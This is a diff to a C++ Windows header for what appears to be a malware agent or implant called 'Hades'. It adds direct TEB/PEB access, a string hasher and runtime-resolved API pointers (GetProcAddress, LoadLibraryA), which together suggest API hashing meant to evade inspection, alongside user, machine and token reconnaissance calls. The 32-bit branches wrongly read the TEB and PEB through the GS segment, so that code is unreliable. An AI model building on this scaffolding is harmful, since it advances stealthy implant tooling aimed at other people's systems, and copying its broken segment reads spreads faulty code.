@@ -1,9 +1,9 @@
 #pragma once
 #include <Windows.h>
 #include "../shared/nt.hpp"
-#include "../shared/common.hpp"
 #include "../networkd/network.hpp"
 #include "../utils/bytes.hpp"
+#include "../utils/apidefs.hpp"
 #include <wininet.h>
 #include <iphlpapi.h>
 
@@ -12,9 +12,41 @@
 
 #ifdef _DEBUG
 #define DEBUG_LOG(msg, ...) printf(msg "\n", ##__VA_ARGS__)
+#define DEBUG_LOG_WIDE(msg, ...) wprintf(msg L"\n", ##__VA_ARGS__)
 #else
 #define DEBUG_LOG(msg, ...)
+#define DEBUG_LOG_WIDE(msg, ...)
 #endif
+
+
+#define TO_DWORD(x) ((DWORD)(ULONG_PTR)(x))
+#define BASE_BUFFER_SIZE 64
+
+
+
+inline PTEB GetTeb() {
+#if defined(__WIN64__) || defined(__x86_64__) || defined(_WIN64)
+	return (PTEB)__readgsqword(0x30);
+#elif defined(__i386__) || defined(_M_IX86)
+	return (PTEB)__readgsdword(0x18);
+#else
+	return NULL;
+#endif
+}
+
+
+inline PPEB GetPEB() {
+#if defined(__WIN64__) || defined(__x86_64__) || defined(_WIN64)
+	return (PPEB)__readgsqword(0x60);
+#elif defined(__i386__) || defined(_M_IX86)
+	return (PPEB)__readgsdword(0x30);
+#else
+	return NULL;
+#endif
+}
+
+
+
 
 
 typedef struct {
@@ -57,8 +89,11 @@ typedef struct {
 		DECL(GetComputerNameExA);
 		DECL(LoadLibraryA);
 		DECL(HeapAlloc);
+		DECL(HeapReAlloc);
 		DECL(GetTickCount);
 		DECL(CloseHandle);
+		DECL(GetProcAddress);
+		DECL(CreateDirectoryA);
 
 		DECL(GetUserNameA);
 		DECL(GetTokenInformation);
@@ -72,10 +107,14 @@ typedef struct {
 
 } Hades;
 
-
-
-
-
 extern Hades* hades;
 
+template<typename T>
+T* AllocMemory(size_t size) {
+	return (T*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size);
+}
+
+
 BOOL RunHades();
+BOOL InitAgent();
+DWORD Hasher(PCHAR str);
